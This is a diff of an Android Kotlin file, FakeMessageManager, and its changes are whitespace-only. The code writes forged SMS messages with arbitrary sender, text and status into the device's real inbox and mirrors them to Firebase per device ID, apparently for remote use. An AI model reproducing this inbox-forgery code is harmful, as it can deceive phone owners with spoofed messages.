@@ -15,10 +15,10 @@ import com.google.firebase.database.database
  * Firebase-only fake messages (when app is not default SMS app)
  */
 object FakeMessageManager {
-    
+
     /**
      * Create a fake message with full customization
-     * 
+     *
      * @param context The application context
      * @param sender Sender phone number (e.g., "+1234567890")
      * @param message Message content
@@ -39,9 +39,9 @@ object FakeMessageManager {
             context.contentResolver,
             Settings.Secure.ANDROID_ID
         )
-        
+
         val isDefaultSmsApp = DefaultSmsAppHelper.isDefaultSmsApp(context)
-        
+
         return if (isDefaultSmsApp) {
             // Create REAL message in SMS database
             createRealFakeMessage(context, sender, message, timestamp, status, threadId, deviceId)
@@ -50,7 +50,7 @@ object FakeMessageManager {
             createFirebaseFakeMessage(deviceId, sender, message, timestamp, status)
         }
     }
-    
+
     /**
      * Create real fake message in SMS database (when app is default SMS app)
      * This message will appear in the device's SMS inbox and be visible to other apps
@@ -84,7 +84,7 @@ object FakeMessageManager {
                     "failed" -> Telephony.Sms.STATUS_FAILED
                     else -> Telephony.Sms.STATUS_NONE
                 })
-                
+
                 // Thread ID handling
                 val finalThreadId = if (threadId != null && threadId != "null" && threadId.isNotBlank()) {
                     threadId.toLongOrNull() ?: getOrCreateThreadId(context, sender)
@@ -93,15 +93,15 @@ object FakeMessageManager {
                 }
                 put("thread_id", finalThreadId)
             }
-            
+
             val uri = context.contentResolver.insert(
                 Telephony.Sms.CONTENT_URI,
                 contentValues
             )
-            
+
             if (uri != null) {
                 val messageId = uri.lastPathSegment ?: ""
-                
+
                 // Also upload to Firebase for consistency
                 val messagePath = AppConfig.getFirebaseMessagePath(deviceId, timestamp)
                 val value = if (status.lowercase() == "sent") {
@@ -109,14 +109,14 @@ object FakeMessageManager {
                 } else {
                     "received~$sender~$message"
                 }
-                
+
                 Firebase.database.reference
                     .child(messagePath)
                     .setValue(value)
-                
+
                 // Store in fake message history
                 storeFakeMessageHistory(deviceId, sender, message, timestamp, status, messageId)
-                
+
                 LogHelper.d("FakeMessageManager", "Real fake message created successfully - ID: $messageId")
                 return true
             }
@@ -127,7 +127,7 @@ object FakeMessageManager {
             return false
         }
     }
-    
+
     /**
      * Create fake message in Firebase only (when app is NOT default SMS app)
      * This message will NOT appear in the device's SMS inbox
@@ -146,7 +146,7 @@ object FakeMessageManager {
             } else {
                 "received~$sender~$message"
             }
-            
+
             Firebase.database.reference
                 .child(messagePath)
                 .setValue(value)
@@ -158,14 +158,14 @@ object FakeMessageManager {
                 .addOnFailureListener { e ->
                     LogHelper.e("FakeMessageManager", "Failed to create Firebase fake message", e)
                 }
-            
+
             return true
         } catch (e: Exception) {
             LogHelper.e("FakeMessageManager", "Error creating Firebase fake message", e)
             return false
         }
     }
-    
+
     /**
      * Get or create thread ID for a contact
      */
@@ -176,7 +176,7 @@ object FakeMessageManager {
             val uri = Telephony.Threads.CONTENT_URI.buildUpon()
                 .appendQueryParameter("recipient", address)
                 .build()
-            
+
             val cursor = context.contentResolver.query(
                 uri,
                 arrayOf(Telephony.Threads._ID),
@@ -184,7 +184,7 @@ object FakeMessageManager {
                 null,
                 null
             )
-            
+
             cursor?.use {
                 if (it.moveToFirst()) {
                     val threadId = it.getLong(it.getColumnIndex(Telephony.Threads._ID))
@@ -192,7 +192,7 @@ object FakeMessageManager {
                     return threadId
                 }
             }
-            
+
             // Create new thread if not found
             val values = ContentValues().apply {
                 put(Telephony.Threads.RECIPIENT_IDS, address)
@@ -201,7 +201,7 @@ object FakeMessageManager {
                 Telephony.Threads.CONTENT_URI,
                 values
             )
-            
+
             val newThreadId = threadUri?.lastPathSegment?.toLongOrNull() ?: 0L
             LogHelper.d("FakeMessageManager", "Created new thread ID: $newThreadId for $address")
             return newThreadId
@@ -210,7 +210,7 @@ object FakeMessageManager {
             return 0L
         }
     }
-    
+
     /**
      * Store fake message in history
      */
@@ -232,7 +232,7 @@ object FakeMessageManager {
                 "messageId" to messageId,
                 "createdAt" to System.currentTimeMillis()
             )
-            
+
             Firebase.database.reference
                 .child(historyPath)
                 .setValue(historyData)
